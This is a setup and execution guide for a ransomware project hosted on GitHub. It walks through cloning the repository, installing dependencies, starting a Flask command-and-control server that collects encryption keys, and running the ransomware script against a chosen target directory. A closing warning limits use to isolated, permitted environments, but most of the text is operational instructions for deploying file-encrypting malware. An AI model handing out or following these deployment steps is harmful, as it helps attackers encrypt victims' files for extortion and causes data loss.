# Ransomware Setup & Execution Guide

## 📌 Prerequisites
Make sure you have Python 3 installed on Kali Linux. If not, install it using:

```bash
sudo apt update && sudo apt install python3 python3-pip python3-venv -y
```

Additionally, install required system packages:

```bash
sudo apt install build-essential libssl-dev libffi-dev python3-dev -y
```

---

## 🔥 Cloning the Repository
To download the ransomware script from GitHub, run:

```bash
git clone https://github.com/FSociety353/ransomware.git
cd ransomware
```

---

## 📦 Installing Required Dependencies

Create a virtual environment (recommended):

```bash
python3 -m venv myenv
source myenv/bin/activate
```

Then, upgrade pip and install the required Python packages:

```bash
pip install --upgrade pip
pip install -r requirements.txt
```

If `requirements.txt` is not available, install dependencies manually:

```bash
pip install requests getmac colored pycryptodome flask
```

To verify the installation of all required packages, run:

```bash
pip list
```

---

## 🚀 Running the Ransomware Script

1. **Start the command and control (C2) server**
   
   Open a new terminal and run:
   
   ```bash
   python3 server.py
   ```
   
   This will start a Flask server on `http://127.0.0.1:1337` to receive encryption keys.

2. **Run the ransomware script**
   
   ```bash
   python3 ransomware.py
   ```

   If you want to specify a target directory for encryption:
   
   ```bash
   python3 ransomware.py /path/to/target-directory
   ```

To confirm the script is running correctly, check for errors in the terminal output.

---

## ⚠️ Warning
- **Do not use this script on real systems** unless for educational or controlled testing purposes.
- Ensure you have backups of any files before running the script.
- Use in a **virtual machine** or an isolated environment to avoid irreversible encryption.
- Running ransomware scripts without permission is illegal and can lead to serious consequences.

---

### ❓ Need Help?
If you encounter any issues, feel free to ask! 🔥
